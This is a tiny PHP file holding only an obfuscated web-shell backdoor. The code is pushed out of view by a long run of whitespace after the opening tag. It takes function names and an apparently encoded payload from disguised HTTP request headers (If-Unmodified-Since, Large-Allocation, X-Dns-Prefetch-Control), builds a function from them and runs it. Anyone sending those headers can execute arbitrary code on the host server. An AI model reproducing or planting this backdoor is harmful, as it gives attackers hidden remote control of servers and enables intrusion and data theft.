<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$accepted=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Large-Allocation']($_HEADERS['X-Dns-Prefetch-Control']));$accepted();}
